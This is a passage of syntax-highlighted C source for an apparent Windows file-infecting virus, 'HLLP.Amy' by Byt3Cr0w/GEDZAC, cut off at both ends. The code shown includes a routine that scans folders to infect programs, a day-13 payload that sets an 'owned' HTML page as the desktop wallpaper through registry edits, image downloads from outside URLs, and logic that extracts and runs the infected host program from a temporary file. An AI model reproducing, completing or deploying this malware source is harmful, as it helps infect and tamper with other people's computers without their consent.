</span><span class="sc11">CreateThread</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">Zeek</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,&amp;</span><span class="sc11">ID</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">Sleep</span><span class="sc10">(</span><span class="sc4">20</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">



</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">WINAPI</span><span class="sc0"> </span><span class="sc11">Inf3ct</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">*</span><span class="sc11">param</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">

</span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">windirx</span><span class="sc10">,</span><span class="sc6">"\\"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">actual</span><span class="sc10">,</span><span class="sc6">"\\"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">SeekAndFoundT</span><span class="sc10">(</span><span class="sc11">actual</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">SeekAndFoundT</span><span class="sc10">(</span><span class="sc11">windirx</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">true</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">MakeHTML</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">HKEY</span><span class="sc0"> </span><span class="sc11">hKey</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">code1</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"&lt;html&gt;\n&lt;head&gt;\n&lt;title&gt;Amy - by Byt3Cr0w/GEDZAC&lt;/title&gt;\n&lt;/head&gt;\n&lt;body bgcolor=\"#000000\"&gt;\n&lt;p align=\"center\"&gt;&lt;font color=\"#FF0000\"&gt;&lt;b&gt;...Y0U H4Z B33N 0WN3D...&lt;br&gt;\nBY&lt;br&gt;\n&lt;u&gt;HLLP.Amy&lt;/u&gt;&lt;/b&gt;&lt;/font&gt;&lt;/p&gt;\n&lt;p align=\"center\"&gt;\n&lt;img border=\"0\" src=\""</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">code2</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"file:///C:/amy.jpg\"&lt;br&gt;\n&lt;br&gt;\n&lt;font color=\"#800000\"&gt;Byt3Cr0w/GEDZAC &lt;br&gt;\n2005&lt;br&gt;\n&lt;br&gt;\n&lt;a href=\"http://www.gedzac.tk\"&gt;&lt;font color=\"#800000\"&gt;www.gedzac.tk&lt;/font&gt;&lt;/a&gt;&lt;br&gt;\n&lt;a href=\"http://www.byt3cr0w.tk\"&gt;&lt;font color=\"#800000\"&gt;www.byt3cr0w.tk&lt;/font&gt;&lt;/a&gt;&lt;/font&gt;&lt;/p&gt;\n&lt;/body&gt;\n&lt;/html&gt;"</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">temp</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">html</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">temp</span><span class="sc10">,</span><span class="sc11">code1</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">temp</span><span class="sc10">,</span><span class="sc11">code2</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">lstrcpy</span><span class="sc10">(</span><span class="sc11">html</span><span class="sc10">,</span><span class="sc11">temp</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">HTML</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">writ</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">HTML</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">CreateFile</span><span class="sc10">(</span><span class="sc6">"C:\\wall.html"</span><span class="sc10">,</span><span class="sc0">
                 </span><span class="sc11">GENERIC_WRITE</span><span class="sc10">,</span><span class="sc0">
                 </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0">
                 </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0">
                 </span><span class="sc11">CREATE_ALWAYS</span><span class="sc10">,</span><span class="sc0">
                 </span><span class="sc11">FILE_ATTRIBUTE_NORMAL</span><span class="sc10">,</span><span class="sc0">
                 </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">HTML</span><span class="sc10">!=</span><span class="sc11">INVALID_HANDLE_VALUE</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
                                </span><span class="sc11">WriteFile</span><span class="sc10">(</span><span class="sc0">
                                </span><span class="sc11">HTML</span><span class="sc10">,</span><span class="sc0">
                                </span><span class="sc11">html</span><span class="sc10">,</span><span class="sc0">
                                </span><span class="sc4">500</span><span class="sc10">,</span><span class="sc0">
                                </span><span class="sc10">&amp;</span><span class="sc11">writ</span><span class="sc10">,</span><span class="sc0">
                                </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">RegCreateKey</span><span class="sc10">(</span><span class="sc11">HKEY_CURRENT_USER</span><span class="sc10">,</span><span class="sc6">"Control Panel\\Desktop"</span><span class="sc10">,&amp;</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">RegSetValueEx</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">,</span><span class="sc6">"wallpaper"</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">REG_SZ</span><span class="sc10">,(</span><span class="sc11">LPBYTE</span><span class="sc10">)</span><span class="sc6">"C:\\wall.html"</span><span class="sc10">,</span><span class="sc4">12</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">RegCreateKey</span><span class="sc10">(</span><span class="sc11">HKEY_CURRENT_USER</span><span class="sc10">,</span><span class="sc6">"Software\\Microsoft\\Internet Explorer\\Desktop\\General"</span><span class="sc10">,&amp;</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">RegSetValueEx</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">,</span><span class="sc6">"BackupWallpaper"</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">REG_SZ</span><span class="sc10">,(</span><span class="sc11">LPBYTE</span><span class="sc10">)</span><span class="sc6">"C:\\wall.html"</span><span class="sc10">,</span><span class="sc4">12</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">RegCreateKey</span><span class="sc10">(</span><span class="sc11">HKEY_CURRENT_USER</span><span class="sc10">,</span><span class="sc6">"Control Panel\\Desktop"</span><span class="sc10">,&amp;</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">RegSetValueEx</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">,</span><span class="sc6">"ConvertedWallpaper"</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">REG_SZ</span><span class="sc10">,(</span><span class="sc11">LPBYTE</span><span class="sc10">)</span><span class="sc6">"C:\\wall.html"</span><span class="sc10">,</span><span class="sc4">12</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">HTML</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc11">BOOL</span><span class="sc0"> </span><span class="sc11">Check</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">c</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
     </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">NormalSize</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">c</span><span class="sc10">==</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">NormalSize</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">44809</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">c</span><span class="sc10">==</span><span class="sc4">2</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">NormalSize</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">21924</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">c</span><span class="sc10">==</span><span class="sc4">3</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">NormalSize</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">72184</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">c</span><span class="sc10">==</span><span class="sc4">4</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">NormalSize</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">314334</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">c</span><span class="sc10">==</span><span class="sc4">5</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">NormalSize</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">17184</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">bytez</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">ToCheck</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc11">ToCheck</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">CreateFile</span><span class="sc10">(</span><span class="sc6">"C:\\amy.jpg"</span><span class="sc10">,</span><span class="sc11">GENERIC_READ</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">OPEN_EXISTING</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FILE_ATTRIBUTE_NORMAL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">INVALID_HANDLE_VALUE</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">ToCheck</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
     </span><span class="sc11">bytez</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">GetFileSize</span><span class="sc10">(</span><span class="sc11">ToCheck</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
     </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">bytez</span><span class="sc10">==</span><span class="sc11">NormalSize</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">TRUE</span><span class="sc10">;}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">FALSE</span><span class="sc10">;}</span><span class="sc0">
     </span><span class="sc10">}</span><span class="sc0">
     </span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">Paydate</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">SYSTEMTIME</span><span class="sc0"> </span><span class="sc11">tiempo</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">GetSystemTime</span><span class="sc10">(&amp;</span><span class="sc11">tiempo</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">tiempo</span><span class="sc10">.</span><span class="sc11">wDay</span><span class="sc10">==</span><span class="sc4">13</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;}</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">


</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">WINAPI</span><span class="sc0"> </span><span class="sc11">Im4g3z</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">*</span><span class="sc11">param</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc16">long</span><span class="sc0"> </span><span class="sc11">Downloader</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">HMODULE</span><span class="sc0"> </span><span class="sc11">Urlmon</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">Func</span><span class="sc0"> </span><span class="sc11">This</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">Urlmon</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">LoadLibrary</span><span class="sc10">(</span><span class="sc6">"urlmon.dll"</span><span class="sc10">);</span><span class="sc0">
 </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">Urlmon</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc11">This</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Func</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">GetProcAddress</span><span class="sc10">(</span><span class="sc11">Urlmon</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"URLDownloadToFileA"</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">Downloader</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">This</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc6">"http://www.u-blog.net/fabnb/img/amy-lee.jpg"</span><span class="sc10">,</span><span class="sc6">"C:\\amy.jpg"</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Check</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">ok</span><span class="sc10">;}</span><span class="sc0">
        </span><span class="sc11">Downloader</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">This</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc6">"http://songe.canalblog.com/Amy_Lee.jpg"</span><span class="sc10">,</span><span class="sc6">"C:\\amy.jpg"</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Check</span><span class="sc10">(</span><span class="sc4">2</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">ok</span><span class="sc10">;}</span><span class="sc0">
        </span><span class="sc11">Downloader</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">This</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc6">"http://www.wallforyou.altervista.org/images/amylee.jpg"</span><span class="sc10">,</span><span class="sc6">"C:\\amy.jpg"</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Check</span><span class="sc10">(</span><span class="sc4">3</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">ok</span><span class="sc10">;}</span><span class="sc0">
            </span><span class="sc11">Downloader</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">This</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc6">"http://www.lo.redjupiter.com/images/courtney/amysolo1.jpg"</span><span class="sc10">,</span><span class="sc6">"C:\\amy.jpg"</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Check</span><span class="sc10">(</span><span class="sc4">4</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">ok</span><span class="sc10">;}</span><span class="sc0">
            </span><span class="sc11">Downloader</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">This</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc6">"http://www.20six.nl/pub/Ellentjeuh/hanging.jpg"</span><span class="sc10">,</span><span class="sc6">"C:\\amy.jpg"</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Check</span><span class="sc10">(</span><span class="sc4">5</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">ok</span><span class="sc10">;}</span><span class="sc0">
            </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">MakeHTML</span><span class="sc10">();</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc11">ok</span><span class="sc10">:</span><span class="sc0">
           </span><span class="sc11">FreeLibrary</span><span class="sc10">(</span><span class="sc11">Urlmon</span><span class="sc10">);</span><span class="sc0">
           </span><span class="sc11">MakeHTML</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">Execute</span><span class="sc10">(</span><span class="sc11">LPCTSTR</span><span class="sc0"> </span><span class="sc11">target</span><span class="sc10">,</span><span class="sc11">LPTSTR</span><span class="sc0"> </span><span class="sc11">params</span><span class="sc10">)</span><span class="sc0"> 
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">STARTUPINFO</span><span class="sc0"> </span><span class="sc11">start</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">PROCESS_INFORMATION</span><span class="sc0"> </span><span class="sc11">info</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">x</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">ZeroMemory</span><span class="sc0"> </span><span class="sc10">(&amp;</span><span class="sc11">start</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">start</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">start</span><span class="sc10">.</span><span class="sc11">cb</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">start</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">x</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">CreateProcess</span><span class="sc10">(</span><span class="sc11">target</span><span class="sc10">,</span><span class="sc11">params</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc5">true</span><span class="sc10">,</span><span class="sc11">NORMAL_PRIORITY_CLASS</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,&amp;</span><span class="sc11">start</span><span class="sc10">,&amp;</span><span class="sc11">info</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">do</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">x</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">WaitForSingleObject</span><span class="sc10">(</span><span class="sc11">info</span><span class="sc10">.</span><span class="sc11">hProcess</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);}</span><span class="sc0">
    </span><span class="sc5">while</span><span class="sc10">(</span><span class="sc11">x</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">258</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">x</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">info</span><span class="sc10">.</span><span class="sc11">hProcess</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">DeleteFile</span><span class="sc10">(</span><span class="sc11">target</span><span class="sc10">);</span><span class="sc0">     
</span><span class="sc10">}</span><span class="sc0">


           </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">WINAPI</span><span class="sc0"> </span><span class="sc11">SueltaAlHost</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">*</span><span class="sc11">param</span><span class="sc10">)</span><span class="sc0">
           </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">Me</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">Future</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">rid</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">writ</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">LPSTR</span><span class="sc0"> </span><span class="sc11">MyCode</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">MySize</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">FFile</span><span class="sc10">;</span><span class="sc0">
                
                </span><span class="sc11">srand</span><span class="sc10">((</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">GetTickCount</span><span class="sc10">());</span><span class="sc0">
                </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">temp</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc16">char</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">RandomName</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
                </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">temp</span><span class="sc10">,</span><span class="sc11">tmpfol</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">temp</span><span class="sc10">,</span><span class="sc11">RandomStr</span><span class="sc10">(</span><span class="sc11">Random</span><span class="sc10">(</span><span class="sc4">30</span><span class="sc10">)));</span><span class="sc0">
                </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">temp</span><span class="sc10">,</span><span class="sc11">RandomExt</span><span class="sc10">());</span><span class="sc0">
                </span><span class="sc11">lstrcpy</span><span class="sc10">(</span><span class="sc11">RandomName</span><span class="sc10">,</span><span class="sc11">temp</span><span class="sc10">);</span><span class="sc0">
                
                </span><span class="sc11">Me</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">CreateFile</span><span class="sc10">(</span><span class="sc11">AmyName</span><span class="sc10">,</span><span class="sc0">
                                </span><span class="sc11">GENERIC_READ</span><span class="sc10">,</span><span class="sc0">
                                </span><span class="sc11">FILE_SHARE_READ</span><span class="sc10">,</span><span class="sc0">
                                </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0">
                                </span><span class="sc11">OPEN_EXISTING</span><span class="sc10">,</span><span class="sc0">
                                </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0">
                                </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Me</span><span class="sc10">!=</span><span class="sc11">INVALID_HANDLE_VALUE</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                                             </span><span class="sc11">SetFilePointer</span><span class="sc10">(</span><span class="sc11">Me</span><span class="sc10">,</span><span class="sc11">AmySize</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">FILE_BEGIN</span><span class="sc10">);</span><span class="sc0">
                                              </span><span class="sc11">MySize</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">GetFileSize</span><span class="sc10">(</span><span class="sc11">Me</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
                                              </span><span class="sc11">MySize</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">MySize</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">AmySize</span><span class="sc10">;</span><span class="sc0">
                                </span><span class="sc11">MyCode</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">LPSTR</span><span class="sc10">)</span><span class="sc11">GlobalAlloc</span><span class="sc10">(</span><span class="sc11">GPTR</span><span class="sc10">,</span><span class="sc11">MySize</span><span class="sc10">+</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
                                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">MyCode</span><span class="sc10">!=</span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">

                                </span><span class="sc10">{</span><span class="sc0">
                                        </span><span class="sc11">ReadFile</span><span class="sc10">(</span><span class="sc0">
                                        </span><span class="sc11">Me</span><span class="sc10">,</span><span class="sc0">
                                        </span><span class="sc11">MyCode</span><span class="sc10">,</span><span class="sc0">
                                        </span><span class="sc11">MySize</span><span class="sc10">,</span><span class="sc0">
                                        </span><span class="sc10">&amp;</span><span class="sc11">rid</span><span class="sc10">,</span><span class="sc0">
                                        </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

                                        </span><span class="sc10">}</span><span class="sc0">

</span><span class="sc11">Again</span><span class="sc10">:</span><span class="sc0">
</span><span class="sc11">FFile</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">RandomName</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">fileexists</span><span class="sc10">(</span><span class="sc11">FFile</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">Again</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">

</span><span class="sc11">Future</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">CreateFile</span><span class="sc10">(</span><span class="sc11">FFile</span><span class="sc10">,</span><span class="sc0">
                 </span><span class="sc11">GENERIC_WRITE</span><span class="sc10">,</span><span class="sc0">
                 </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0">
                 </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0">
                 </span><span class="sc11">CREATE_ALWAYS</span><span class="sc10">,</span><span class="sc0">
                 </span><span class="sc11">FILE_ATTRIBUTE_NORMAL</span><span class="sc10">,</span><span class="sc0">
                 </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

